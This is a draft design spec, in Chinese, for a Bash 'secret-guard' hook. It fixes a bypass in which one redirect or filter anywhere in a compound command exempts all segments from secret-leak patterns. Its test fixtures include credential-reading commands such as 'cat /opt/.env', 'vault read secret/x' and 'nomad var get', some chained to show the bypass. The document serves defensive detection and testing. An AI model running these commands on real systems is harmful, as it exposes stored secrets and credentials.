# secret-guard: fail-safe 逐段判定 (aria-plugin #128)

> **Level**: Minimal (Level 2 Spec)
> **Status**: 📝 **Draft (v8 = v7 findings 修订)** — R1 `6C+19M` → R2 `5C+12M` → R3 `4C+13M` → **owner 裁定拉回性能根治** → v4 → 2026-08-08 前提刷新 → R4 (5 席全 REVISE, `6C+13M+17m`, `max_rounds=4` 耗尽未收敛) → owner 裁定 [2] 先修 Critical → v5 = R4-fix → **R5 (owner 批准的超配额全量重审, 5 席全 REVISE, 去重后 `5C`; 判定 22 条新错**由 R4-fix 自身引入**)** → **owner 2026-08-09 裁定: 换执笔人 + C-1 采候选 A** → v6 = R5-fix (tech-lead 执笔) → owner 2026-08-09 逐条裁完 13 条待决项 (采 12 / 改判 1 / 其中 1 条的一个子项经实测驳回) → v7 (主 loop 执笔) → **backend-architect 独立复核席 2026-08-09 出 2 minor findings + tech-lead 平行一致性复核出 4 Major + 7 minor, owner 裁定四条处置意见 → 本版 v8 (backend-architect 执笔)**。审计轨迹全文见 `.aria/audit-reports/post_spec-R{1,2,3,4,5}-*` + R4/R5 汇总 `post_spec-R{4,5}-*-aggregated.md`; 13 条裁定逐条理由见 `.aria/notes/2026-08-09-secret-guard-128-owner-decision-queue.md`
> **⚠️ 收敛状态未变**: v7→v8 是对复核 findings 的修订落地, **不构成新一轮审计**。spec 仍 `converged: false`, 未进 A.2。
> **执笔者 (流程事实, 复核时须知)**: v1–v5 由作者 (主 loop) 执笔; v6 = R5-fix **由 tech-lead 执笔, 主 loop 只做核验** (owner 2026-08-09 裁定, 依据是本 cycle 五次「勘正动作里新引入错误」中最近一次 —— R4-fix 104 行被 R5 判定引入 22 条新错、其中 3 条 Critical 由勘正本身造成; 结论是**执笔者与复核者同一人时这类错误系统性逃逸**)。v7 **由主 loop 执笔** —— 被改的文本作者是 tech-lead, 故「勘正者 ≠ 原作者」这条仍满足; 但主 loop 正是有过 R4-fix 前科的那一方, ⇒ v7 须由非主 loop 的一席复核后方可视为落定, 重点复核对象是 §What.1 命令位置清单与 `BLOCK_KW_RE`。**v8 由 backend-architect 执笔** —— 依据同一条「勘正者 ≠ 原作者」原则: v6 作者是 tech-lead, v7 作者是主 loop, backend-architect 是两版均未参与的一席, 故由其执笔 v7 findings 的落地; owner 与 tech-lead 将在 v8 完成后复核。
> **Created**: 2026-08-04
> **Issue**: [aria-plugin #128](https://forgejo.10cg.pub/10CG/aria-plugin/issues/128) — triage **confirmed / critical / 5-5 复现** ([17512](https://forgejo.10cg.pub/10CG/aria-plugin/issues/128#issuecomment-17512)) + [分隔符更正 17545](https://forgejo.10cg.pub/10CG/aria-plugin/issues/128#issuecomment-17545)

> ### 设计演进 (不写版本计数 —— 计数本身漂过一次)
>
> | 版本 | 设计 | 被什么推翻 |
> |------|------|-----------|
> | v1 | 逐段判定, 切 `;` `&&` `\|\|` `&` 换行 | R1: `&` 与 `&>` 冲突; 换行切碎 heredoc; 三个子问题未预见 |
> | v2 | 缩到只切顶层 `;` `&&` | R2: **切 `;`/`&&` 本身不安全** —— 它们大量嵌在 `{ }` / `for…do…done` / `[[ … && … ]]` / `for ((i=0; i<3; i++))` 里, 实测 **5/5 安全写法被误报**, 且语料零覆盖 ⇒ 回归 SC 恒绿是假绿 |
> | v3 | **fail-safe 降级**: 先检测块结构, 不可安全分段则退回整命令判定 | R3: 判据**不封闭** (`exec >/dev/null; …` 无块标记仍误报); 命令位置清单漏 换行/`&`/`time`; **重排只在 benign 负载有效**, 最坏负载 +583% |
> | v4 | v3 + **`has_filter` 13 处转 bash 内建** (owner 裁定拉回) + 启发式表述 + 判据补漏 | R4: 转内建**不是语义保持变换** (两席独立实证 fail-open); `exec`/`time` 漏「仅命令位置」; 「行首/换行之后」不得裸 `^`; **SC-16 的事实前提被实测证伪** |
> | v5 = R4-fix | v4 + **段级换行守卫** (强制) + 两处判据限定补齐 + SC-16 收窄为 `(?:` 一项 + SC-6/14/15 扩容 + SC-9 拆两腿 | R5: 段级守卫**治 fail-open 却造出更宽的 fail-close** (三席独立实测); SC-14 验收公式与自己的 fixture 互斥; SC-6 的 `case` fixture 结构性恒绿; 一处**虚构的文档自我历史**; 转出 9 复现命令**自证伪**; 三个引用标签是编的 |
> | v6 = R5-fix | v5 − 段级守卫 + **逐行内建 helper** (复刻 grep 逐行语义, owner 采候选 A) + SC-14 验收公式拆两组 + SC-6 的 `case` 改隔离单元断言 + 事实/命令/标签/数字四类勘误 + SC-8 补最坏档 + SC-9b 落 Task | 无设计层推翻; owner 逐条裁完遗留的 13 条待决项 |
> | v7 = R5-fix + 13 条裁定 | 命令位置清单 −`in` +`!` (保 `&`) · 后台记号补 `<&` · 表头 keyword/内建 · B-2 改判为转出 10 · 关键决策补「手写扫描 vs 解析器」· 转出 1 量词口径定案 141/81/79/7/5 · SC-3 有效面交计数器 · Task 1.12 bump 前 re-check · Task 1.8 补 sed 重读约束 · 五行表/schema/结构/时态四处编辑 | 独立复核: backend-architect 出 2 minor (`!` 边界未刻画 · 转出 10 行号差 4) + tech-lead 平行一致性复核出 4 Major + 7 minor, 均无 Critical/Major 命中规范性实现文本本身 |
> | **v8 = v7 findings 修订 (本版)** | `BLOCK_KW_RE` 本体**不动** (`!?` 改法不收, 转出 11 立案) · 保 `&` 的裁定确认, notes.md 记录面补全反转链路 · SC-6/SC-14 各补一条鉴别 fixture (17 项 / 5 条) 并逐格重算反事实 (含联动的 SC-16 反事实计数) · Task 1.4 补 SC-3 有效面 · `:695`→`:691` 行号勘正 (proposal.md + notes.md 两处) · 转出 10 措辞与回指补全 · Task 1.10a 取代排序倒挂的 Task 1.12 · 表头术语 / `<&` 归属判断 / 转出 2·3·5·8 措辞 / 「五个结果」自洽性 四处 tech-lead minor · `換`→`换` 繁简勘正 | 待主 loop 与 tech-lead 复核 |
>
> **v5→v6 的性质**: R5 五席一致认为**设计层已收敛**, 不再有设计争议; v5 被推翻的**全部**是勘正动作自身的执行精度 (实现语义选择 / 验收公式 / 事实核实 / 计数口径)。本版据此只改这四类, **不动** fail-safe 降级 + 先 pattern 后 credit + 13 处转内建这三条设计主干。「勘正动作里新引入错误」本 cycle 至此累计五次 (R2 的 68/52 · R3 的 `case`→1 · R3 抓的 `done` 论据 · R4-M-1 换证 · R4-fix 整体), **换执笔人是对这条复发规律的直接处置, 不是对 v5 内容的整体否定** —— v5 把 R4 五席诊断全部读进去了, 无一条被无视。
>
> **R4 的性质与前三轮不同**: 前三轮推翻的是**旧设计**, R4 的 4 条实质 Critical **全部指向 v4 新拉回的那部分范围** (`has_filter` 转内建) 与判据表新增行。owner 2026-08-04 拉回性能根治的裁决方向经三席独立实测**确认正确** (SC-8 四档全部净减少), 代价是把风险从性能面转移到语义保持面 —— 有明确收益的转移, 不是失误。
>
> **本 cycle 被审计方实测推翻的作者断言 (7 条)**: (1) `&` 可作切分记号; (2)「保守不切 = 不会少拦」方向反; (3)「切错 = 安全回归」; (4)「pattern 匹配已全是 bash 内建」(`has_filter` 尚有 13 处 subprocess); (5)「60ms 固定成本是 bash 启动」(实为 `jq` 58ms); (6) R1→R2 重写时把已核实的 141 改成 139; (7)「只切 `;` `&&` = 最小可靠子集」—— 最小但**不可靠**。**无一由作者自查发现**。另有一次自查拦截: v2 验证脚本的正则被 `sed` 破坏后仍"全绿", 作者发现并干净重写后才采信 (见 §What.5 的验证脚本要求)。

## Why

`hooks/secret-guard.sh` 的 pattern 匹配与 `has_filter` credit 均对**整条 `$command`** 求值, 由单一全局开关 (`:663`) 控制全部 **141** 条 pattern。命令任一处出现 credit 串 ⇒ 全部段落免疫全部 pattern (triage 5/5 实测):

```
cat /opt/.env; echo hi >/dev/null                      → exit=0
nomad var put p1 @f1 >/dev/null; nomad var put p2 @f2  → exit=0   ← Aria#170 泄漏形态本身
vault read secret/x; nomad var put p @f >/dev/null     → exit=0   ← 跨 pattern 家族
```

单条 `cat /opt/.env` → `exit=2`。`critical` 判据见 triage comment。

## What

### 1. fail-safe 降级 — 本版的核心机制 (**启发式, 非完备判据**)

**分段前先判断该命令是否"看起来可以安全分段"**; 判否则退回整命令判定 (= 现状行为, 零改善零恶化)。

> ⚠️ **承诺强度已下调 (R3-C-2 证伪)**: 前一版写「降级 = 只在能保证正确时才改变行为」。**该判据类别不封闭** —— 实测 `exec >/dev/null; nomad var get x` **无任何块标记**却同样不可安全分段 (`exec` 的重定向作用于整个 shell 后续, 0→2 误报)。故本机制只能表述为**启发式**: 覆盖已知的块结构类, 但**不保证穷尽**。未知形态的误报归转出 8。

不可安全分段的判据 (引号外命中任一即降级):

| 类别 | 标记 |
|------|------|
| 块字符 | `{` `}` `(` `)` 反引号 `[[` `]]` `<<` `<<<` |
| 块起始关键字 (**命令位置 且 词边界**) | `for` `while` `until` `if` `case` `select` |
| **作用域型 keyword / 内建 (R3-C-1)** | `exec` `time` — **命令位置 且 词边界** |
| **后台记号 (R3-C-1)** | `&` (单独出现, 非 `&&` / `&>` / `>&` / `\|&` / `<&`) |

> **表头措辞 (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-5)**: `time` 是 shell **keyword**、`exec` 是 **builtin** (`type -t` 实测分别为 `keyword` / `builtin`), 原表头「作用域型内建」对 `time` 不准, 已改。两者共同点是**建立 shell 级作用域**, 与是不是内建无关 —— 这才是它们进本表的理由。
>
> **后台记号排除清单补 `<&` (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-6)**: `<&` 是 `>&` 的镜像重定向形态 (`exec 3<&0` / `cat <&3` 实测合法), 原清单列了 `>&` 却漏它。漏它的后果是**多降级** (把 `<&` 的 `&` 当裸 `&`) —— 方向安全但损覆盖。**注意它与命令位置表里保留的 `&` 不冲突**: 本行管的是「`&` 要不要触发降级」, 位置表管的是「`&` 之后算不算命令位置」, 两者正交 (见 §命令位置定义的驳回记录)。
>
> **`<&` 是否也要同步补进 §2 分段规则表与转出 4 (tech-lead m-2, backend-architect 复核裁定: 不补, 理由记录于此)**: 两处**语义不同源**——本行 (§What.1) 管的是**降级判据** (裸 `&` 要不要触发 fail-safe 降级), 是 v7 新增/当前活跃的机制; 而 §2 分段规则表与转出 4 里 `&` / `&>` / `>&` / `\|&` / `2>&1` 的枚举管的是**切分记号**, 记录的是 v1「按 `&` 切」被 R1 证伪的历史教训。**当前 `split_top()` 的切分记号本就只有顶层 `;` / `&&` / `\|\|` 三种** (见 §2 首行), 从未把裸 `&` 当作切分候选——故 `<&` 不进这份枚举不产生任何功能性覆盖缺口, 补与不补都不改变 `split_top()` 的行为, 纯属历史记录的完整性问题而非活跃判据。明确记录以免读者误以为两处该同步维护而反复纠结: **两份清单语义正交, §What.1 的 `<&` 勘正不需要连带 §2 / 转出 4**。
>
> **两条 token 类判据一律「命令位置 **且** 词边界」, 不得只写其一 (R4 tech-lead R4-C-2 → R5 tech-lead R5-C-3 二次收窄)**
>
> R4 只补了「仅命令位置」。**位置限定挡不住命令位置上的子串**: `timeout` 的 `time` 子串就落在行首 = 命令位置。R5-fix 执笔者机械复验两个读法 (`entangle.sh`, 只差 `\b`):
>
> ```
> SC-14 fixture                                  仅命令位置   位置+词边界
> echo runtime; cat /opt/.env; true >/dev/null      true         true
> timeout 5 curl x; cat /opt/.env; true >/dev/null  FALSE        true      <<< 分歧
> execute-plan; cat /opt/.env; true >/dev/null      FALSE        true      <<< 分歧
> exec >/dev/null; nomad var get x                  false        false     (两读法都正确降级)
> time env; cat /opt/.env                           false        false     (同上)
> ```
>
> 后果有二, 都是硬的: (1) **SC-14 新增 fixture #2 在「仅命令位置」的字面文本下不可满足** —— 它要求 `safe_to_split=true`, 字面实现给 false; (2) 305 条语料里 **6 条**的 `exec`/`time` 子串落在命令位置, 其中**只有 2 条真是 `exec`/`time` 命令** (`exec 3< …` / `time env`), 另 **4 条是 `timeout …`** (`timeout 5 env` / `timeout 5 ./run-env-check` ×2 / `timeout 30 make env`) —— 按「仅命令位置」全部无谓降级, R4-C-2 点名的危害原封不动。
>
> 语义上也只有命令位置且成词的 `exec` / `time` 才建立 shell 级作用域, `docker exec` / `find -exec` / `timeout` 里的那些不是。**关键字行同改**: 两行本来就必须同精度 —— R4-C-2 定 Critical 的理由正是「两行两种精度直接产出两种实现」, 只给其中一行加词边界会原样重开该缺陷。SC-14 锁该方向 (本版按 R5 qa-engineer C-1 拆了验收公式)。

**命令位置**定义 (R3-C-1 指出前一版清单有漏且「行首」二义): 行首 / **换行之后** / `;` / `&&` / `\|\|` / `\|` / `&` / `!` / `do` / `then` / `else` / `elif` 之后。

> **本清单 owner 2026-08-09 裁定改过两项 (R5 code-reviewer m-5, 三项建议中采两项驳一项)**。仍是 **12 类** —— 删一加一, 故 §What.1 与 Task 1.1(c) 的「其余 10 类」计数**不受影响** (原提案估的「两处连带计数」代价不成立)。
>
> | 变动 | 处置 | 依据 |
> |------|------|------|
> | 错项 `in` | **删除** | `in` 只出现在 `for` / `select` / `case` 三种文法里, 其后是**词表或模式**, 永远不是命令位置。留着只会让 `echo in for` 这类无风险命令被无谓降级; 且这三种构造自身的关键字都在命令位置上, 删 `in` 不损失任何覆盖 |
> | 漏项 `!` | **补入** | `!` 后接命令 (可含复合命令), 实测 `bash -n -c '! for f in a; do :; done'` 与 `! time true` 均合法 ⇒ 不补则 `!` 后的关键字漏检 |
> | 「死条目 `&`」 | **驳回, 保留 `&`** | 该项**不成立**。后台记号行判降级的是**裸 `&`**, 显式排除 `&&` / `&>` / `>&` / `\|&`; 而 `cat x \|& for f in a; do …; done` 语法合法 (`bash -n` 实测), 此形态下 `\|&` 不触发后台记号, 紧邻 `[[:space:]]*for` 的位置 token 正是 `&` (`\|` 之后跟的是 `&` 不是空白) ⇒ **删 `&` 会让 `\|&` 后接关键字不再降级, 循环体被切碎**, 是一次覆盖回归。「X 已被 Y 吸收」类的冗余判断必须枚举 Y 的**排除项**后才能下 |
>
> **「保留 `&`」独立复核结论 (backend-architect 2026-08-09, owner 同日确认)**: 独立复现 `bash -n` 结果一致; 另探索过「第三条路」——把 `\|&` 显式编码进位置清单、同时删掉裸 `&`——**实测更差**: `cat x & for f in a; do :; done` (裸后台 `&` 紧跟 for, 合法语句) 在该写法下**漏检**, 因为它只覆盖 `\|&` 尾部的 `&`, 不覆盖独立的裸后台 `&`。保留裸 `&` 同时覆盖两种形态, 是三个候选里唯一不劣的选择, 复现命令与结果见 W-1 引用的复核报告。
>
> **`!` 的已知边界 (owner 2026-08-09 裁定归转出 11, 本版 `BLOCK_KW_RE` 正则文本一个字节不动)**: `!`/`do`/`then`/`else`/`elif` 都是普通字符/词而非 shell 元字符, 可以是任意更长词的一部分——`!` 紧邻关键字 (如 `echo myapp!for-config`)、`do`/`then` 作为更长词的子串 (如 `redo for-real` / `strengthen for a moment`, **`do`/`then` 这一类子问题 v6 就已存在, 与本次 `!` 改动无关**) 都会被误判为命令位置, 触发不必要的 fail-safe 降级。方向安全 (只多降级不漏拦, 代价是性能而非安全), 已验证的候选修法与复现命令见转出 11。

> **⚠️ 「行首」/「换行之后」在 bash `[[ =~ ]]` 下不得写作裸 `^` (R4 backend-architect **CRITICAL-2**, 实现约束)**: bash 走 glibc regex 且无 `REG_NEWLINE`, `^` **只锚定整串开头, 不锚定每行行首** —— 与 grep 的逐行语义相反。backend-architect R4 独立实测: `[[ $'a\nb' =~ ^b ]]` 不匹配; 按「行首→`^`」的直觉翻译, `$'sleep 1\nfor f in a; do cat /opt/.env; done >/dev/null'` 的 `safe_to_split()` 返回 TRUE (应为 FALSE), 循环体被错切成独立段 ⇒ **重开 v2 那次 5/5 误报的同一失效模式**。**必须显式写作含真实换行字符的交替**。逐项核过 12 类位置: 只有「行首」「换行之后」2 类依赖 `^` 语义需专门处理; 其余 10 类靠字面 token / 字符类匹配 (`[[:space:]]` 天然含换行), 不受影响。
>
> **规范写法 (R5-fix 补, R5 code-reviewer m-4 —— 散文说「字面换行」不足以让人写对)**: 正则主体用**单引号**(无转义层), 只把换行拼进去:
>
> ```bash
> nl=$'\n'
> BLOCK_KW_RE='(^|'"$nl"'|;|&&|\|\||\||&|!|do|then|else|elif)[[:space:]]*(for|while|until|if|case|select)\b'
> ```
>
> **⛔ 不得写 `(^|\n)`** —— bash ERE 里 `\n` 是**字母 n**, 不是换行符。它**既漏又多** (实测 `a1_newline.sh` / `a1_pick.sh`):
>
> | 方向 | 探针 | `(^|<真换行>)` | `(^|\n)` |
> |------|------|----------------|----------|
> | **漏** | `$'cd /tmp\nfor f in a b; do …; done >/dev/null'` | 命中 (正确降级) | **不命中** —— 与裸 `^` 同样的失效 |
> | **多** | `run for` / `xnfor` / `n for` / `green if x` | 不命中 (正确) | **全部命中** —— 「以 n 结尾的词 + 关键字」被误判 |
>
> 两个方向各有一条 SC 锁 (实测各只红 1 条, 隔离性好): 漏 → **SC-6 的换行 fixture**; 多 → **SC-14 的 A-4**。上面这条规范写法与「先存 `nl` 再用双引号拼」的写法实测**产出字节相同的正则串**, 选单引号版只因它少一层转义。
>
> **换行必须计入命令位置的支撑证据 (R4-M-1 换证)**: 前一版举 `sleep 1 & for f in a; do cat /opt/.env; done >/dev/null` 说「由 0 翻 2」—— 该例**一个换行都没有** (python `repr` 取字节确认), 且它是 R3-C-1 用来论证「`&` 之后也是命令位置」的例子被搬来支撑换行结论; 更关键的是 v4 采纳后台记号行后该命令**必然走 fallback**, 换行计不计入都恒为现状 (canonical 直调复验 exit=0)。**规则对, 证据错**。改用两席实测可分辨的真换行反例: `$'cd /tmp\nfor f in a b; do cat /opt/.env; done >/dev/null'` —— 含换行读法 fallback (0), 不含换行读法切分后 2。这是本 cycle 第四次「勘正动作里新引入错误」(R2 的 68/52 → R3 的 `case`→1 → R3 抓的 `done` 论据 → 本条)。

> **只检测起始关键字**: 有 `do`/`done` 必有 `for`/`while`, 有 `then`/`fi` 必有 `if`。**必须限定命令位置** —— 否则 `ls; echo for >/dev/null` 里作为普通参数的 `for` 会被误判 (SC-14 锁该方向; 前一版这里举 `echo done` 为例是**错的** —— `done` 根本不在关键字集内, 论证不成立, R3 code-reviewer 勘正)。

### 2. 分段规则 (仅在可安全分段时生效)

| 记号 | 处置 |
|------|------|
| 顶层 `;` `&&` `\|\|` | **切** |
| `\|` (管道) | **不切** — filter 语义载体; **12 条 pattern 把 `\|` 编码进正则本身**, 按 `\|` 切会让 4 条真泄漏用例由 2 翻 0 (R1 tech-lead M-4 实测) |
| 换行 | **不切** — 会切碎 heredoc body |
| `&` `&>` `>&` `\|&` `2>&1` | **不切** — `&` 与重定向记号冲突 (R1 C-1: 打红 2 条合法 credit 写法) |
| 引号内 / `\;` 转义 | **不切** — quote/转义感知 |

**`||` 纳入切分** (v2 曾排除, R2 M-3 勘正): 排除它会留下**一字符绕过** —— `put p1 >/dev/null || put p2` 修后仍 exit=0 而 `;` 形态 exit=2; 且「`||` 需前瞻」的理由不成立 (与 `&&` 同一次单字符前瞻)。

### 3. 判定语义 — **先 pattern 后 credit** (R2 C-1 唯一范围内解法)

```
if not safe_to_split(command):            # §1
    return legacy_whole_command_verdict(command)
for seg in split_top(command):                    # §2
    for pat in patterns:
        if seg =~ pat:                            # bash 内建 =~, 零 fork
            if not compute_credit(seg):           # 13 处判据, 走 §4 的逐行 helper, 同样零 fork
                BLOCK(pat, seg)                   # pat/seg = 当前这一轮的绑定
ALLOW
```

> 伪代码两处勘正 (R4/R5 三席各自点过): (a) `compute_credit` 在 Task 1.3b 之后**零 fork** —— 前一版注释写「13 处 subprocess」, 与 §What.4「使逐段 credit 计算零 fork」直接矛盾; (b) `BLOCK(pat, seg)` 的 `pat` 前一版**未绑定** (写成 `any(...)` 推导式后 `pat` 已出作用域), 改成显式内层循环后 BLOCKED 消息取的就是**当前命中的那条 pattern**。`# guard:ack` 的命令级语义 (SC-12) 在**进入本伪代码之前**判定, 不在段级循环内 —— canonical `:302`/`:311` 两处 ack 检测位于 filter detection 之前。

**顺序重排是布尔等价的** —— R3 tech-lead 独立验证 (`has_filter` 纯函数分析 + 306 条实证 0 不一致): 两者都是「命中 pattern ∧ 无 credit ⇒ 拦」, 未命中时 credit 值不影响结果。

**但重排本身不足以解决性能** (R3 backend C-1 + tech-lead C-3 双方实测推翻作者原判):

> ⚠️ **下表五行原本混用了三个不同基线且一处都没标注 (R4 code-reviewer M-2)** —— 而这张表是 owner 拉回 §What.4 的直接依据。已补「基线」列。「省 80%」与「+102%」**不可比**: 前者是两种逐段实现互比, 后者是逐段 vs 现状整命令。SC-8 的闸门口径是**相对现状整命令**, 与前两行不同源。
>
> **行数与单位 (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-7)**: 引言原写「四行」而表身是五行, 已改。第五行的 `177.8` / `267.7` **源报告未标单位, 本版不补** —— 补一个未经核实的单位正是 memory `feedback_never_write_unverified_impossibility_claims` 点名的形态。该行已显式标注「无单位, 不作验收依据」; SC-8 本就要求**五档 Phase B 全部复算**, 该行数字不进任何闸门。

| 负载 | 每段先算 credit | 先 pattern 后 credit | 结论 | **基线 (R4 补)** |
|------|----------------|---------------------|------|------------------|
| 2 段全 benign | 146ms | **28ms** | 省 80% | pattern-first vs credit-first (表内两列相除) |
| 3 段全 benign | 158ms | **22ms** | 省 86% | 同上 |
| **2 段全命中** | — | — | **+102%** | pattern-first vs **现状整命令判定** |
| **3 段全命中 (即本 spec 推荐的迁移写法)** | — | — | **+583%** | pattern-first vs **现状整命令判定** |
| ↑ 同档「此档重排还更慢」 | 177.8 (**无单位**) | 267.7 (**无单位**) | **重排反而更慢** (方向可用, 绝对值不可引用) | pattern-first vs credit-first (**第三个基线**) |

作者原判「重排已化解性能矛盾」**只在 benign 负载成立**, 取样漏掉最坏情况; 而最坏负载恰是 spec 自己在迁移建议里推荐的「逐段补 redirect」。

### 4. `has_filter` 13 处转 bash 内建 (**owner 2026-08-04 裁定拉回范围, 原转出 6**)

`has_filter` 区尚有 **13 处 `echo "$command" | grep -qE …`** 未被 v1.26.0 O3 覆盖 —— 逐段化后 fork 次数 = 13 × 段数, 这才是性能矛盾的**根因**。逐条改为 bash 内建 `[[ =~ ]]` (与 `:658` 匹配循环同款, O3 已验证该改造在本 hook 可行), 使逐段 credit 计算**零 fork**。

owner 裁决理由: 绕开 (重排) 只在部分负载有效, 且与 spec 自己的迁移建议冲突; 根治后性能问题不再依赖负载分布。

**代价 (诚实记录)**: 本 spec 范围由「分段」扩为「分段 + credit 判据重构」。采候选 A 后 **13 处正则文本本身不动**, 变的是求值方式 (`grep` 逐行 → helper 逐行), 故须逐条验证**判定不变**而非「正则改写正确」—— SC-15。

> #### ⛔ 转内建**不是**语义保持变换 —— 必须逐行复刻 grep 语义 (R4 tech-lead R4-C-1 + R4 backend-architect CRITICAL-1 → **R5 三席推翻 R4 的修法** → owner 2026-08-09 采候选 A)
>
> **缺陷本体 (R4 两席独立发现, 成立)**: `echo "$command" | grep -qE` 是**逐行**求值 (grep 按 `\n` 拆记录, 任一行匹配即真); bash `[[ =~ ]]` 是**整串**求值 (无 `REG_NEWLINE`, `.` 与 `[[:space:]]` 都跨行)。POSIX `[[:space:]]` 字符类**含换行符**, 而 13 处判据**全部含 `[[:space:]]`** (10 处用 `+`, 12 处用 `*` —— 逐条分布与计数口径见 §6, 已固化进 `corpus_census.py`)。⇒ 逐字直译会在多行 `$command` 上**双向**失真: `cat /opt/.env | awk 'BEGIN{}⏎{print $1}'` 由 **2 → 0** (漏拦, 安全回归); `… | jq keys⏎echo done` 由 **0 → 2** (误报, 即 R2-C-2 被定 Critical 的那一类)。
>
> **⛔ R4 写死的「段级换行守卫」已撤回 —— 它治了一半、造出更宽的另一半**。R5 三席各自实测同一结论 (R5 tech-lead R5-C-1 / R5 backend-architect CRITICAL-1 / R5 code-reviewer C-1), 且**提案人 backend-architect 是推翻自己 R4 方案的那一席**。R5-fix 执笔者独立重跑 (`probes.sh` / `e2e.sh`, 从 canonical 机械抽 13 判据建真 hook 拷贝):
>
> | 形态 | canonical | 段级守卫 | 逐行内建 |
> |------|-----------|----------|----------|
> | `… \| jq keys⏎echo done` (R2-C-2 那一类误报) | 0 | **2** ← 守卫没治 | **0** ✓ |
> | `cd /tmp⏎… \| jq keys⏎echo finished` | 0 | **2** ← 守卫没治 | **0** ✓ |
> | `cat /opt/.env \| awk 'BEGIN{}⏎{print $1}'` (漏拦) | 2 | 2 ✓ | 2 ✓ |
> | `echo start⏎cat /opt/.env \| sha256sum` (无关前导行) | 0 | **2** ← **守卫新造** | **0** ✓ |
> | `cat /opt/.env \\⏎  >/dev/null` (= 本 spec 自己推荐的迁移写法) | 0 | **2** ← **守卫新造** | **0** ✓ |
>
> 守卫是**段级、与判据无关**的粗粒度短路: 段内一有换行, 13 处判据**全部**被清零。故它引入的 fail-close 覆盖 **13/13 处判据**, 比它要修的 fail-open 面更宽; 而「无关换行 + 单行完整 filter」是写 bash 的自然形态。它还打穿了 §What.1 的地基 —— 「fallback = 现状行为, **零改善零恶化**」在多行命令上不成立 (构造 5 条必走 fallback 的多行命令, 5/5 由 0 翻 2)。
>
> **✅ 强制修法 (Task 1.3b 写死, owner 采候选 A)**: grep 的语义是**逐行**, 那就在内建里**照做逐行** —— 不是用毯子近似它。13 处共用一个 helper, 零 fork:
>
> ```bash
> # 复刻 `echo "$x" | grep -qE "$re"` 的记录语义: 按 \n 拆行, 任一行命中即真。
> # $1 = 正则 (不加引号代入 =~, 否则退化为字面匹配); $2 = 待判字符串 (段)
> _sg_line_match() {
>   local _re="$1" _s="$2" _l
>   while IFS= read -r _l || [[ -n "$_l" ]]; do
>     [[ "$_l" =~ $_re ]] && return 0
>   done <<< "$_s"
>   return 1
> }
> ```
>
> 13 处判据逐条由 `if echo "$command" | grep -qE <re>; then` 改写为 `if _sg_line_match <re> "$seg"; then`, **正则文本一个字节不动**。
>
> **本写法是规范性的, 不得"等价改写"** —— 本 spec 已被「同一句散文两种读法产出两种实现」咬过三次 (v4 的 `exec`/`time` 行、裸 `^`、`(^|\n)`)。任何偏离必须过下方的行为闸。
>
> **实测 (R5-fix 执笔者独立复跑, 未采信任何上轮数字)**:
>
> | 口径 | 结果 |
> |------|------|
> | 13 正则 × 11 条对抗字符串 (含空串 / 裸换行 / 首尾换行) vs **grep 真值** | **0 / 143 分歧** |
> | 23 条 credit 级探针 (三组多行形态) vs canonical | **0 分歧** (段级守卫 20 / 字面直译 5) |
> | 11 条端到端 hook 探针 vs canonical | **0 分歧** (段级守卫 8 / 字面直译 3) |
> | 305 条全语料 vs canonical | **0 分歧** |
> | 真 366 条测试套件 (逐行内建版 hook) | 365/366, 唯一 fail 是暂存目录缺 `hooks.json` 的路径检查, **非行为** |
> | 性能 (进程内计时, N=300, 单段) | fork `46102` µs → 逐行内建 `2396` µs (**−94.8%**); 字面直译 `766` µs |
>
> 逐行内建比字面直译贵 (多一层纯 bash 循环, 无 fork/无 I/O: `read` / `[[ ]]` / here-string 全是内建), 但相对**现状 fork 版**仍是一个数量级的净减少 ⇒ **SC-8 的性能结论完整保住**。
>
> **为什么不采另外两个候选**: 方案 2 (逐条收窄 `[[:space:]]` 为 `[ \t]`、`.` 为 `[^\n]`) 需对每处字符类逐条判断"这里是否本就想要跨行容忍", 是**逐条定制审查**而非一次性机械套用, 出错面显著更大 (v5 曾写「工程量大 13 倍」, 该倍数**未经核实**, 本版删去, 只保留定性判断)。方案 B (`${BASH_REMATCH[0]}` 检查实际命中子串, R5 backend-architect 提) 同样零 fork 且明显优于段级守卫, 但它是"近似 grep"的第二种近似, 在「纯尾随换行」形态上仍与 canonical 分歧; 候选 A 是**唯一实测 0 分歧**的解, 且由 tech-lead 与 code-reviewer 两席独立殊途同归。owner 2026-08-09 据此裁定采 A。
>
> **这不属于转出 8 的范围** —— 转出 8 讲的是 `safe_to_split` 判据不封闭 (该 fallback 却没 fallback); 这里是 fallback 判定之后, credit 计算本身在同一物理段内跨行失真。
>
> **为什么现有验收抓不到 (两轮同一句判语)**: SC-11 全语料对**字面直译**恒绿 (0/305), 对**段级守卫**同样恒绿 (0/305, 语料仅 6 条含换行且无一条依赖 credit); SC-15 原文「每处 命中/不命中 各 1 条」一个字都没要求多行形态。这正是 memory `feedback_noop_in_test_env_hardening_needs_mechanism_assertion` + `feedback_counterfactual_test_for_every_new_sc` 的形态: 新机制配了新锁, 锁在它该抓的那一类上零鉴别力 —— 第二次复发时坏的是**修复动作本身**。SC-15 已按此重写为**正负双向**。

### 5. 其余语义

- 任一段 blocked ⇒ 整体 `exit 2` (fail-safe, 与现状一致)。
- BLOCKED 消息须指出**触发段落**, 否则复合命令下无法定位。(该行为对已有的整条命令回显不新增信息暴露面, 已知残留风险见转出 10 —— tech-lead m-4b)
- `# guard:ack` 维持**命令级**语义 (SC-12 锁定 —— R2 M-5 指出该裁定此前无 SC 无 task)。
- **跨段 pattern fail-open**: 逐段化后依赖跨 `;` 上下文的 pattern 会失配 (实证 `set -o posix; set | grep foo` 2→0)。本版不兜底, SC-7 锁现状。

### 6. 数字口径必须可复算 (根治反复出现的计数争议)

本 cycle 同一统计对象被**五次**尝试给出结果 (作者 68/52/16 · R1 tech-lead 72/53/19 · **R1 qa 53/17/2** (schema 与其余四组不同, 不可并列比较, 见下) · R2 qa 65/49/16 · 作者权威计数器 65/49/16), 根因是**数法未固化**而非谁算错。（措辞勘正 tech-lead m-7 —— 前一版「同一统计出过五个**结果**」暗示五者互相可比, 与紧接的「schema 不同不可并列」注解自相矛盾; 改成「被五次尝试给出结果」后, **五**这个数仍是「尝试次数」而非「可比数值个数」, 不受影响, 下文「第六次计数争议」(13 处 credit 判据) 与转出 1 段「第七次计数争议的种子」(pattern 量词口径) 依赖的计数链条同源保留）

